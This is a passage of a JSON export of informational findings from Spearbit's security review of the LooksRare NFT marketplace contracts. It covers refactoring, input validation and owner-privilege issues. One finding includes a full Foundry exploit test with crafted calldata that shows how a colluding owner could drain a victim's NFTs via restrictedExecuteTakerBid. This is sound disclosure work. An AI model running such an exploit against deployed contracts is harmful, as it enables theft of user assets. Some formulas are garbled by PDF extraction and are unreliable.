        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Taker is the entity that initiates the calls to LooksRareProtocol's 3 order execution endpoints. Most implemented strategies (which are fixed/chosen by the maker through signing the makerXxx which includes the strategyId) require the itemIds and amounts fields for the maker and the taker to mirror each other. i : the j th element of maker's itemIds fields (the struct would be either MakerBid or MakerAsk depending  M j on the context)  M j a : the j th element of maker's amounts fields (the struct would be either MakerBid or MakerAsk depending on the context)  T j i : the j th element of taker's itemIds fields (the struct would be either TakerBid or TakerAsk depending on the context)  T j a : the j th element of taker's amounts fields (the struct would be either TakerBid or TakerAsk depending on the context) Borrowing notations also from:  \"Constraints among the number of item ids and amounts for taker or maker bids or asks are inconsistent among different strategies\"  IneheritedStategy : T j i = M j  StrategyDutchAuction : T j i , T j i = M j a = M j a i , T j a = M j a , taker can send extra itemIds and amounts but they won't be  StrategyUSDDynamicAsk : T j i = M j i , T j a = M j a , taker can send extra itemIds and amounts but they won't be used. used.  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : T 0 i = M 0 i , T 0 a = M 0 a = 1 , taker can send extra itemIds and amounts but they won't be used.  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : T 0 a = M 0 a = 1 , maker's itemIds are unused.  StrategyCollectionOffer : T 0 a = M 0 a , maker's itemIds are unused and taker's T i a for i > 0 are also unused.  StrategyItemIdsRange : M 0 i (cid:20) T j i (cid:20) M 1 i , P T j a = M 0 a . 39 For  IneheritedStategy  StrategyDutchAuction  StrategyUSDDynamicAsk  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid Shared taker's itemIds and amounts are redundant as they should exactly match maker's fields. For the other strategies, one can encode the required parameters in either maker's or taker's additionalParameters fields.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "discount == 10_000 is not allowed in executeBasisPointsDiscountCollectionOfferStrategyWith- TakerAsk",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "executeBasisPointsDiscountCollectionOfferStrategyWithTakerAsk reverts if discount == 10_000, but does not if discount == 99_99 which almost has the same effect. Note that if discount == 10_000, (forgetting about the revert) price = desiredPrice = 0. So, unless the taker (sender of the transaction) has set its takerAsk.minPrice to 0 (maker is bidding for a 100% discount and taker is gifting the NFT), the transaction would revert: if (takerAsk.minPrice > price) { // takerAsk.minPrice > 0 revert AskTooHigh(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restructure executeMultipleTakerBids's input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "executeMultipleTakerBids has the following form function executeMultipleTakerBids( OrderStructs.TakerBid[] calldata takerBids, OrderStructs.MakerAsk[] calldata makerAsks, bytes[] calldata makerSignatures, OrderStructs.MerkleTree[] calldata merkleTrees, address affiliate, bool isAtomic ) For the input parameters provided, we need to make sure takerBids, makerAsks, makerSignatures, and merkle- Trees all have the same length. We can enforce this requirement by definition, if we restructure the input passed to executeMultipleTakerBids.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restructure transferBatchItemsAcrossCollections input parameter format",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "transferBatchItemsAcrossCollections has the following form function transferBatchItemsAcrossCollections( address[] calldata collections, uint256[] calldata assetTypes, address from, address to, uint256[][] calldata itemIds, uint256[][] calldata amounts ) where collections, assetTypes, itemIds and amounts are supposed to have the same lengths. One can enforce that by redefining the input parameter and have this invariant enforced by definition.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "An approved operator can call transferBatchItemsAcrossCollections",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "TransferManager has 3 endpoints that an approved operator can call:  transferItemsERC721  transferItemsERC1155  transferBatchItemsAcrossCollections The first 2 share the same input parameter types but differ from transferBatchItemsAcrossCollections: , address transferItemsERC1155 address ,! address[], address[], address, address , uint256[][], uint256[][] // ,! transferBatchItemsAcrossCollections , address, uint256[], uint256[] // transferItemsERC721, 44 An operator like LooksRareProtocol might have an owner ( OL ) that can select/add arbitrary endpoint of this transfer manager for an asset type, but only call the transfer manager using the same input parameter types regardless of the added endpoint. So in this case, OL might add a new asset type with TransferManager.transferBatchItemsAcrossCollections.selector as the selector and this transfer manager as the manager. Now, since this operator/LooksRareProtocol (and possibly other future implementations of approved operators) uses the same list of parameters for all endpoints, when _transferNFT gets called, the transfer manager using the transferBatchItemsAcrossCollections endpoint but with the following encoded data: the protocol would call abi.encodeWithSelector( managerSelectorOfAssetType[assetType].selector, collection, sender, recipient, itemIds, amounts ) ) A crafty OL might try to take advantage of the parameter type mismatch to create a malicious payload (address, address, address, uint256[], uint256[] ) that when decoded as (address[], address[], address, address, uint256[][], uint256[][]) It would allow them to transfer any NFT tokens from any user to some specific users. ; interpreted paramters | original parameter ,! ; ---------------------------------- ,! -------- c Ma.s or msg.sender 00000000000000000000000000000000000000000000000000000000000000c0 ; collections.ptr 0000000000000000000000000000000000000000000000000000000000000100 ; assetTypes.ptr ,! 00000000000000000000000000000000000000000000000000000000000000X3 ; from ,! 00000000000000000000000000000000000000000000000000000000000000X4 ; to ,! itemIds.ptr -> 0xa0 Tb.r or Mb.s x 0000000000000000000000000000000000000000000000000000000000000140 ; itemIds.ptr ,! amounts.ptr -> 0xc0 + 0x20 * itemIds.length 00000000000000000000000000000000000000000000000000000000000001c0 ; amounts.ptr ,! itemIds.length | collection | from / | to / | | | ; ; | itemIds[0] | itemIds[1] ... Fortunately, that is not possible since in this particular instance the transferItemsERC721 and transferItem- sERC1155's amounts's calldata tail pointer always coincide with transferBatchItemsAcrossCollections's itemIds's calldata tail pointer (uint256[] amounts, uint256[][] itemIds) which unless both have length 0 it would cause the compiled code to revert due to out of range index access. This is also dependent on if/how the compiler encodes/decodes the calldata and if the compiler would add the bytecodes for the deployed code to revert for OOR accesses (which solc does). This is just a lucky coincidence otherwise, OT could have exploited this flaw.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared login in different StrategyFloorFromChainlink strategies can be refactored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": " executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid.  executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCol- lectionOfferStrategyWithTakerAsk. Each group of endpoints in the above list share the exact same logic. The only difference they have is the formula and checks used to calculate the desiredPrice based on a given floorPrice and premium/discount. function a1(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a1(<INTER_PARAMS>); // inlined computation of _a1 <POST_COMMON_BLOCK> } function a2(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a2(<INTER_PARAMS>); // inlined computation of _a2 <POST_COMMON_BLOCK> }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Setting protocol and ask fee amounts and recipients can be refactored in ExecutionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Setting and calculating the protocol and ask fee amounts and recipients follow the same logic in _executeStrategyForTakerAsk and _executeStrategyForTakerBid.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Creator fee amount and recipient calculation can be refactored in ExecutionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The create fee amount and recipient calculation in _executeStrategyForTakerAsk and _executeS- trategyForTakerBid are identical and can be refactored.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "The owner can set the selector for a strategy to any bytes4 value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The owner can set the selector for a strategy to any bytes4 value (as long as it's not bytes4(0)). Even though the following check exists if (!IBaseStrategy(implementation).isLooksRareV2Strategy()) { revert NotV2Strategy(); } There is no measure taken to avoid potential selector collision with other contract types.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies. notation description Ti Ta Mi Ma length of taker's bid (or ask depending on the context) item ids length of taker's bid (or ask depending on the context) amounts length of maker's bid (or ask depending on the context) item ids length of maker's bid (or ask depending on the context) amounts 59  IneheritedStategy : Ti = Ta = Mi = Ma  StrategyItemIdsRange : Ti (cid:20) Ta, Mi = 2, Ma = 1 (related issue)  StrategyDutchAuction : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyUSDDynamicAsk: Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma = 1  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : Ti = 1, 1 = Ta, Ma = 1  StrategyCollectionOffer : Ti = 1, 1 (cid:20) Ta, Ma = 1 The equalities above are explicitly enforced, but the inequalities are implicitly enforced through the compiler's out-of-bound revert. Note that in most cases (except StrategyItemIdsRange) one can enforce Ti = Ta = Mi = Ma and refactor this logic into a utility function.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Requirements/checks for adding new transfer managers (or strategies) are really important to avoid self-reentrancy through restrictedExecuteTakerBid from unexpected call sites",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "When a new transfer manager gets added to the protocol, there is a check to make sure that this manager cannot be the protocol itself. This is really important as restrictedExecuteTakerBid allows the protocol itself to call this endpoint. If the check below was omitted: if ( transferManagerForAssetType == address(0) || // transferManagerForAssetType == address(this) || selectorForAssetType == bytes4(0) ) { } revert ManagerSelectorEmpty(); The owner can add the protocol itself as a transfer manager for a new asset type and pick the selector to be ILooksRareProtocol.restrictedExecuteTakerBid.selector. Then the owner along with a special address can collude and drain users' NFT tokens from an actual approved transfer manager for ERC721/ERC1155 assets. The special feature of restrictedExecuteTakerBid is that once it's called the provided parameters by the maker are not checked/verified against any signatures. The PoC below includes 2 different custom strategies for an easier setup but they are not necessary (one can use the default strategy). One creates the calldata payload and the other is called later on to select a desired NFT token id. 60 The calldata to restrictedExecuteTakerBid(...) is crafted so that the corresponding desired parameters for an actual transferManager.call can be set by itemIds; parameters offset ,! ------------------------------------------------------------------------------------------------------- c ,! 0x0000 interpreted parameters ---------- | original msg.sender, , can be changed by stuffing 0s 0000000000000000000000000000000000000000000000000000000000000080 0000000000000000000000000000000000000000000000000000000000000180 ,! 00000000000000000000000000000000000000000000000000000000000000X1 ; sender ,! 00000000000000000000000000000000000000000000000000000000000000a0 ,! msg.sender / signer ho, orderHash, 0xa0 | collection | signer / | Ta.r or | i[] ptr 0x0080 ,! to, can be changed by stuffing 0s 00000000000000000000000000000000000000000000000000000000000000X2 ; Tb.r | a[] ptr , 0x0180 00000000000000000000000000000000000000000000000000000000000000X3 ; Tb.p_max 00000000000000000000000000000000000000000000000000000000000000a0 00000000000000000000000000000000000000000000000000000000000000c0 00000000000000000000000000000000000000000000000000000000000000e0 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 from 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X4 ; sid 00000000000000000000000000000000000000000000000000000000000000X5 ; t 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X6 ; T 00000000000000000000000000000000000000000000000000000000000000X7 ; C 00000000000000000000000000000000000000000000000000000000000000X8 ; signer ,! 00000000000000000000000000000000000000000000000000000000000000X9 ; ts 00000000000000000000000000000000000000000000000000000000000000Xa ; te 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000001c0 00000000000000000000000000000000000000000000000000000000000001e0 0000000000000000000000000000000000000000000000000000000000000200 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 | i[].len | i[0] | i[1] | i[2] | i[3] | i[4] | i[5] | i[6] | i[7] | i[8] | i[9] | i[10] | i[11] | i[12] | i[13] , | i[14] | i[15] | i[16] | i[17] | i[18] | i[19] | i[20] | i[21] | i[22] ; T = real_collection ; C = currency ; t = assetType ; sid = strategyId ; ts = startTime ; te = endTime ; Ta = takerAsk ; Tb = takerBid // file: test/foundry/AssetAttack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; 61 interface IERC1271 { function isValidSignature( bytes32 digest, bytes calldata signature ) external returns (bytes4 magicValue); } contract PayloadStrategy is IBaseStrategy { address private owner; address private collection; address private currency; uint256 private assetType; address private signer; uint256 private nextStartegyId; constructor() { owner = msg.sender; } function set( address _collection, address _currency, uint256 _assetType, address _signer, uint256 _nextStartegyId ) external { if(msg.sender != owner) revert(); collection = _collection; currency = _currency; assetType = _assetType; signer = _signer; nextStartegyId = _nextStartegyId; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) { itemIds = new uint256[](23); itemIds[0] = 0xa0; itemIds[1] = 0xc0; itemIds[2] = 0xe0; 62 itemIds[8] = nextStartegyId; itemIds[9] = assetType; itemIds[11] = uint256(uint160(collection)); itemIds[12] = uint256(uint160(currency)); itemIds[13] = uint256(uint160(signer)); itemIds[14] = 0; // startTime itemIds[15] = type(uint256).max; // endTime itemIds[17] = 0x01c0; itemIds[18] = 0x01e0; itemIds[19] = 0x0200; } } contract ItemSelectorStrategy is IBaseStrategy { address private owner; uint256 private itemId; uint256 private amount; constructor() { owner = msg.sender; } function set( uint256 _itemId, uint256 _amount ) external { if(msg.sender != owner) revert(); itemId = _itemId; amount = _amount; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) itemIds = new uint256[](1); itemIds[0] = itemId; amounts = new uint256[](1); amounts[0] = amount; ) { } } contract AttackTest is ProtocolBase { PayloadStrategy private payloadStrategy; 63 ItemSelectorStrategy private itemSelectorStrategy; MockERC20 private mockERC20; // // can be an arbitrary address uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); // this address will define an offset in the calldata // and can be changed up to a certain upperbound by // stuffing calldata with 0s. address private specialUser1 = address(0x180); // NFT token recipient of the attack can also be changed // up to a certain upper bound by stuffing the calldata with 0s address private specialUser2 = address(0x3a0); // can be an arbitrary address address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); { looksRareProtocol.initiateOwnershipTransfer(signingOwner); } vm.stopPrank(); vm.startPrank(signingOwner); { looksRareProtocol.confirmOwnershipTransfer(); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); mockERC721.mint(victimUser, 1); // This particular strategy is not a requirement of the exploit. // it just makes it easier payloadStrategy = new PayloadStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, PayloadStrategy.execute.selector, true, address(payloadStrategy) ); itemSelectorStrategy = new ItemSelectorStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, ItemSelectorStrategy.execute.selector, false, address(itemSelectorStrategy) ); } 64 vm.stopPrank(); _setUpUser(victimUser); } function testAttack() public { vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(looksRareProtocol), looksRareProtocol.restrictedExecuteTakerBid.selector ); payloadStrategy.set( address(mockERC721), address(mockERC20), 0, victimUser, 2 // itemSelectorStrategy ID ); itemSelectorStrategy.set(1, 1); OrderStructs.MakerBid memory makerBid = _createSingleItemMakerBidOrder({ // payloadStrategy bidNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // LooksRareProtocol itself orderNonce: 0, collection: address(0x80), // calldata offset currency: address(mockERC20), signer: signingOwner, maxPrice: 0, itemId: 1 }); bytes memory signature = _signMakerBid(makerBid, signingOwnerPK); OrderStructs.TakerAsk memory takerAsk; vm.stopPrank(); vm.prank(specialUser1); looksRareProtocol.executeTakerAsk( takerAsk, makerBid, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); assertEq(mockERC721.balanceOf(victimUser), 0); assertEq(mockERC721.ownerOf(1), specialUser2); } }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "viewCreatorFeeInfo can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "viewCreatorFeeInfo includes a low-level staticcall to collection's royaltyInfo endpoint and later its return status is compared and the return data is decoded.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "_verifyMerkleProofOrOrderHash can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_verifyMerkleProofOrOrderHash includes a if/else block that calls into _computeDigestAndVer- ify with almost the same inputs (only the hash is different).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "isOperatorValidForTransfer can be modified to refactor more of the logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "isOperatorValidForTransfer is only used to revert if necessary. The logic around the revert decision on all call sites.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "avoid transferring in _transferFungibleTokens when sender and recipient are equal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Currently, there is no check in _transferFungibleTokens to avoid transferring funds from sender to recipient when they are equal. There is only one check outside of _transferFungibleTokens when one wants to transfer to an affiliate. But if the bidUser is the creator, or the ask recipient or the protocolFeeRecipient, the check is missing.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep the order of parameters consistent in updateStrategy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In updateStrategy, isActive is set first when updating storage, and it's the second parameter when supplied to the StrategyUpdated event. But it is the last parameter supplied to updateStrategy.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "_transferFungibleTokens does not check whether the amount is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "_transferFungibleTokens does not check whether amount is 0 to skip transferring to recipient. For the ask recipient and creator amounts the check is performed just before calling this function. But the check is missing for the affiliate and protocol fees.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyItemIdsRange.executeStrategyWithTakerAsk - Maker's bid amount might be entirely ful- filled by a single ERC1155 item",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "StrategyItemIdsRange allows a buyer to specify a range of potential item ids (both ERC721 and ERC1155) and a desired amount, then a seller can match the buyer's request by picking a subset of items from the provided range so that the desired amount of items are eventually fulfilled. a taker might pick a single ERC1155 item id from the range and fulfill the entire order with multiple instances of that same item.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define named constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": " ExecutionManager.sol#L289 : 0x7476320f is cast sig \"OutsideOfTimeRange()\"  TransferSelectorNFT.sol#L30 : 0xa7bc96d3 is cast sig \"transferItemsERC721(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC721.selector  TransferSelectorNFT.sol#L31 : 0xa0a406c6 is cast sig \"transferItemsERC1155(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC1155.selector.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and executeCollectionStrategyWithTakerAskWithProof can be relaxed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the above context, a maker is bidding a maximum price pmax and a taker is asking a minimum price pmin, the strategy should calculate a price p in the range [pmin, pmax ] and so we would need to have pmin (cid:20) pmax . The above strategies pick the execution price to be pmax (the maximum price bid by the maker), and since the taker is the caller to the protocol we would only need to require pmin (cid:20) pmax . But the current requirement is pmin = pmax . if ( ... || makerBid.maxPrice != takerAsk.minPrice) { revert OrderInvalid(); }",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change occurances of whitelist to allowlist and blacklist to blocklist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the codebase, whitelist (blacklist) is used to represent entities or objects that are allowed (denied) to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add more documentation on expected priceFeed decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The Chainlink strategies are making the following assumptions 1. All priceFeeds in StrategyFloorFromChainlink have a decimals value of 18. 2. The priceFeed in StrategyUSDDynamicAsk has a decimals value of 8. Any priceFeed that is added that does not match these assumptions would lead to incorrect calculations.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code duplicates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "* In some places, Chainlink staleness is checked using block.timestamp - updatedAt > maxLa- tency, and in other places it is checked using block.timestamp > maxLatency + updatedAt. Consider refactor- ing this code into a helper function. Otherwise, it would be better to use only one version of the two code snippets across the protocol.  The validation check to match assetType with the actual amount of items being transferred is duplicated among the different strategies instead of being implemented at a higher level once, such as in a common function or class that can be reused among the different strategies.  _executeStrategyForTakerAsk and _executeStrategyForTakerBid almost share the same code.  TakerBid, TakerAsk can be merged into a single struct.  MakerBid, MakerAsk can be merged into a single struct.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Low level calls are not recommended as they lack type safety and won't revert for calls to EOAs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Low-level calls are not recommended for interaction between different smart contracts in modern versions of the compiler, mainly because they lack type safety, return data size checks, and won't revert for calls to Externally Owned Accounts.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Insufficient input validation of orders (especially on the Taker's side)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There is a lack of consistency in the validation of parameters, as some fields of the taker's order are checked against the maker's order while others are not. It is worth noting that we have not identified any significant impact caused by this issue.  Missing validation of strategyId  Missing validation of collection  Most strategies only validate length mismatches on one side of the order. Also, they don't usually validate that the lengths match between both sides. For example, in the DutchAuction strategy, if the makerAsk has itemIds and amounts arrays of length 2 and 2, then it would be perfectly valid for the takerBid to use itemIds and amounts arrays of length 5 and 7, as long as the first two elements of both arrays match what is expected. (FYI: I filed a related issue for the ItemIdsRange strategy, which I think is more severe of an issue because the mismatched lengths can actually be returned from the function).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "LooksRareProtocol's owner can take maker's tokens for signed orders with unimplemented strat- egyIds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "If a maker signs an order that uses a strategyId that hasn't been added to the protocol yet, the protocol owner can add a malicious strategy afterward such that a taker would be able to provide no fulfillment but take all the offers.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
